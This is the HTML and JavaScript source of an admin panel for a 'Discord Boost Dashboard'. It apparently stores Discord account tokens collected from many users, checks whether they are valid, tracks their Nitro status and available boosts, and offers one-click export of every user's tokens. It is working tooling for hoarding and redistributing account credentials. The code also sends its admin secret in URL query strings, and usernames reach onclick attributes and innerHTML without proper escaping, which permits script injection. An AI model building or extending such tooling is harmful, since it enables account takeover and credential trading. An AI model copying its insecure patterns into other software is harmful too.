<!DOCTYPE html>
<html>
<head>
    <title>Admin Panel - Discord Boost Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #0a0a1a; color: #fff; padding: 20px; }
        .container { max-width: 1600px; margin: auto; }
        .header { background: linear-gradient(135deg, #ed4245, #c03537); padding: 25px; border-radius: 15px; margin-bottom: 25px; text-align: center; }
        .header h1 { font-size: 2em; margin-bottom: 5px; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 25px; }
        .stat-card { background: #1a1a2e; border-radius: 12px; padding: 20px; text-align: center; border: 1px solid #2a2a3e; transition: transform 0.2s; }
        .stat-card:hover { transform: translateY(-2px); }
        .stat-number { font-size: 2.8em; font-weight: bold; color: #5865f2; }
        .stat-label { color: #9494b8; margin-top: 8px; font-size: 14px; }
        .card { background: #1a1a2e; border-radius: 15px; padding: 20px; margin-bottom: 20px; border: 1px solid #2a2a3e; }
        .card h2 { margin-bottom: 20px; border-left: 4px solid #5865f2; padding-left: 15px; font-size: 1.4em; }
        table { width: 100%; border-collapse: collapse; }
        th, td { text-align: left; padding: 14px 12px; border-bottom: 1px solid #2a2a3e; }
        th { color: #9494b8; font-weight: 600; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; }
        td { font-size: 14px; }
        .valid { color: #57f287; font-weight: bold; }
        .invalid { color: #ed4245; }
        .nitro { color: #faa81a; font-weight: bold; }
        input, select, button { padding: 10px 16px; margin: 5px; border-radius: 8px; border: none; font-size: 14px; }
        input, select { background: #2a2a3e; color: white; border: 1px solid #3a3a4e; }
        input:focus, select:focus { outline: none; border-color: #5865f2; }
        button { background: #5865f2; color: white; cursor: pointer; font-weight: 600; transition: all 0.2s; }
        button:hover { background: #4752c4; transform: scale(1.02); }
        button.danger { background: #ed4245; }
        button.danger:hover { background: #c03537; }
        button.success { background: #23a55a; }
        button.success:hover { background: #1e8545; }
        .search-box { display: flex; gap: 12px; margin-bottom: 20px; flex-wrap: wrap; }
        .search-box input { flex: 1; min-width: 200px; }
        .user-row { cursor: pointer; transition: background 0.2s; }
        .user-row:hover { background: #2a2a3e; }
        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.85);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            background: #1a1a2e;
            border-radius: 15px;
            padding: 25px;
            max-width: 900px;
            width: 90%;
            max-height: 85%;
            overflow-y: auto;
        }
        .close { float: right; cursor: pointer; font-size: 28px; color: #9494b8; }
        .close:hover { color: #fff; }
        .token-item {
            background: #0a0a1a;
            padding: 12px;
            margin: 8px 0;
            border-radius: 8px;
            font-family: monospace;
            font-size: 12px;
            word-break: break-all;
            border: 1px solid #2a2a3e;
        }
        .token-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; flex-wrap: wrap; gap: 10px; }
        .token-status { font-size: 11px; padding: 2px 8px; border-radius: 10px; }
        .token-status.valid { background: #57f28720; color: #57f287; }
        .token-status.invalid { background: #ed424520; color: #ed4245; }
        .action-buttons { display: flex; gap: 12px; margin-top: 20px; flex-wrap: wrap; }
        .loading { text-align: center; padding: 40px; color: #9494b8; }
        @media (max-width: 768px) { th, td { padding: 8px; font-size: 12px; } .stat-number { font-size: 2em; } }
    </style>
</head>
<body>
<div class="container">
    <div id="loginScreen" class="card" style="max-width: 400px; margin: 100px auto; text-align: center;">
        <h2 style="margin-bottom: 20px;">🔐 Admin Login</h2>
        <input type="password" id="adminPassword" placeholder="Enter admin secret" style="width: 100%; margin-bottom: 15px;">
        <button onclick="login()" style="width: 100%;">Login</button>
    </div>

    <div id="adminDashboard" style="display: none;">
        <div class="header">
            <h1>🔐 Admin Control Panel</h1>
            <p>Manage all users, tokens, and boost activity</p>
        </div>
        <div class="stats-grid" id="statsGrid"></div>

        <div class="card">
            <h2>👥 All Users</h2>
            <div class="search-box">
                <input type="text" id="userSearch" placeholder="Search by username..." onkeyup="filterUsers()">
                <button onclick="refreshData()">🔄 Refresh</button>
                <button onclick="exportAllData()" class="success">📥 Export All Tokens</button>
            </div>
            <div style="overflow-x: auto;">
                <table id="usersTable">
                    <thead><tr><th>Username</th><th>Tokens</th><th>Valid</th><th>Invalid</th><th>Nitro</th><th>Actions</th></tr></thead>
                    <tbody id="usersTableBody"><tr><td colspan="6" class="loading">Loading users...</td></tr></tbody>
                </table>
            </div>
        </div>
    </div>
</div>

<div id="userModal" class="modal">
    <div class="modal-content">
        <span class="close" onclick="closeModal()">&times;</span>
        <h2 id="modalTitle">User Tokens</h2>
        <div id="modalBody" style="margin-top: 20px;"></div>
        <div class="action-buttons">
            <button onclick="exportUserTokens()" class="success">📥 Export This User's Tokens</button>
            <button onclick="deleteAllUserTokens()" class="danger">🗑️ Delete All User's Tokens</button>
        </div>
    </div>
</div>

<script>
    let adminSecret = '';
    let allUsers = [];
    let currentUser = '';
    let currentUserTokens = [];

    async function login() {
        const password = document.getElementById('adminPassword').value;
        if (!password) { alert('Enter admin secret'); return; }
        try {
            const res = await fetch(`/api/admin/verify?secret=${encodeURIComponent(password)}`);
            const data = await res.json();
            if (data.authorized) {
                adminSecret = password;
                document.getElementById('loginScreen').style.display = 'none';
                document.getElementById('adminDashboard').style.display = 'block';
                refreshData();
            } else { alert('Invalid admin secret'); }
        } catch (err) { alert('Error connecting to server'); }
    }

    async function refreshData() {
        try {
            const res = await fetch(`/api/admin/all_data?secret=${encodeURIComponent(adminSecret)}`);
            const data = await res.json();
            if (data.error) { alert(data.error); return; }
            allUsers = data.users || [];
            updateStats(data);
            renderUsersTable();
        } catch (err) { alert('Error loading data'); }
    }

    function updateStats(data) {
        const statsGrid = document.getElementById('statsGrid');
        statsGrid.innerHTML = `
            <div class="stat-card"><div class="stat-number">${data.total_users || 0}</div><div class="stat-label">Total Users</div></div>
            <div class="stat-card"><div class="stat-number">${data.total_tokens || 0}</div><div class="stat-label">Total Tokens</div></div>
            <div class="stat-card"><div class="stat-number">${allUsers.reduce((sum, u) => sum + (u.valid_count || 0), 0)}</div><div class="stat-label">Valid Tokens</div></div>
            <div class="stat-card"><div class="stat-number">${allUsers.reduce((sum, u) => sum + (u.nitro_count || 0), 0)}</div><div class="stat-label">Nitro Tokens</div></div>
        `;
    }

    function renderUsersTable() {
        const tbody = document.getElementById('usersTableBody');
        const searchTerm = document.getElementById('userSearch')?.value.toLowerCase() || '';
        const filteredUsers = allUsers.filter(u => u.username.toLowerCase().includes(searchTerm));
        if (filteredUsers.length === 0) { tbody.innerHTML = '<tr><td colspan="6" class="loading">No users found</td></tr>'; return; }
        tbody.innerHTML = filteredUsers.map(user => `
            <tr class="user-row" onclick="showUserTokens('${escapeHtml(user.username)}')">
                <td><strong>${escapeHtml(user.username)}</strong></td>
                <td>${user.tokens?.length || 0}</td>
                <td><span class="valid">${user.valid_count || 0}</span></td>
                <td><span class="invalid">${user.invalid_count || 0}</span></td>
                <td><span class="nitro">${user.nitro_count || 0}</span></td>
                <td><button class="danger" onclick="event.stopPropagation(); deleteUser('${escapeHtml(user.username)}')">Delete User</button></td>
            </tr>
        `).join('');
    }

    function filterUsers() { renderUsersTable(); }

    async function showUserTokens(username) {
        currentUser = username;
        document.getElementById('modalTitle').innerHTML = `Tokens for: ${username}`;
        document.getElementById('modalBody').innerHTML = '<div class="loading">Loading tokens...</div>';
        document.getElementById('userModal').style.display = 'flex';
        try {
            const res = await fetch(`/api/admin/user_tokens?secret=${encodeURIComponent(adminSecret)}&username=${encodeURIComponent(username)}`);
            const data = await res.json();
            if (data.error) throw new Error(data.error);
            currentUserTokens = data.tokens || [];
            renderUserTokens(currentUserTokens);
        } catch (err) { document.getElementById('modalBody').innerHTML = `<div class="error">Error loading tokens: ${err.message}</div>`; }
    }

    function renderUserTokens(tokens) {
        if (!tokens.length) { document.getElementById('modalBody').innerHTML = '<div class="loading">No tokens found for this user</div>'; return; }
        document.getElementById('modalBody').innerHTML = tokens.map(token => `
            <div class="token-item">
                <div class="token-header">
                    <strong>Token:</strong>
                    <span class="token-status ${token.is_valid ? 'valid' : 'invalid'}">${token.is_valid ? '✅ Valid' : '❌ Invalid'}</span>
                </div>
                <div style="word-break: break-all;"><code>${escapeHtml(token.token || token)}</code></div>
                <div style="margin-top: 8px; font-size: 11px; color: #9494b8;">
                    ${token.nitro_type ? `<span class="nitro">✨ ${token.nitro_type}</span> | ` : ''}
                    ${token.boosts_available ? `🎮 ${token.boosts_available} boosts | ` : ''}
                    ${token.added_at ? `📅 Added: ${new Date(token.added_at).toLocaleString()}` : ''}
                </div>
            </div>
        `).join('');
    }

    function closeModal() { document.getElementById('userModal').style.display = 'none'; }

    async function deleteUser(username) {
        if (!confirm(`⚠️ Delete user "${username}" and ALL their tokens? This cannot be undone!`)) return;
        try {
            const res = await fetch(`/api/admin/delete_user?secret=${encodeURIComponent(adminSecret)}&username=${encodeURIComponent(username)}`, { method: 'DELETE' });
            const data = await res.json();
            if (data.error) { alert(data.error); return; }
            alert(`✅ User "${username}" deleted`);
            refreshData();
            closeModal();
        } catch (err) { alert('Error deleting user'); }
    }

    async function deleteAllUserTokens() {
        if (!confirm(`⚠️ Delete ALL tokens for "${currentUser}"? This cannot be undone!`)) return;
        try {
            const res = await fetch(`/api/admin/delete_user_tokens?secret=${encodeURIComponent(adminSecret)}&username=${encodeURIComponent(currentUser)}`, { method: 'DELETE' });
            const data = await res.json();
            if (data.error) { alert(data.error); return; }
            alert(`✅ All tokens deleted for "${currentUser}"`);
            showUserTokens(currentUser);
            refreshData();
        } catch (err) { alert('Error deleting tokens'); }
    }

    function exportUserTokens() {
        if (!currentUserTokens.length) { alert('No tokens to export'); return; }
        const data = currentUserTokens.map(t => t.token || t);
        const blob = new Blob([data.join('\n')], { type: 'text/plain' });
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = `${currentUser}_tokens.txt`;
        a.click();
        URL.revokeObjectURL(blob);
    }

    function exportAllData() {
        if (!allUsers.length) { alert('No data to export'); return; }
        const allTokens = [];
        Promise.all(allUsers.map(async (user) => {
            const res = await fetch(`/api/admin/user_tokens?secret=${encodeURIComponent(adminSecret)}&username=${encodeURIComponent(user.username)}`);
            const data = await res.json();
            if (data.tokens) { data.tokens.forEach(t => allTokens.push(`[${user.username}] ${t.token || t}`)); }
        })).then(() => {
            const blob = new Blob([allTokens.join('\n')], { type: 'text/plain' });
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = `all_users_tokens.txt`;
            a.click();
            URL.revokeObjectURL(blob);
        });
    }

    function escapeHtml(str) { return str.replace(/[&<>]/g, function(m) { if (m === '&') return '&amp;'; if (m === '<') return '&lt;'; if (m === '>') return '&gt;'; return m; }); }
</script>
</body>
</html>
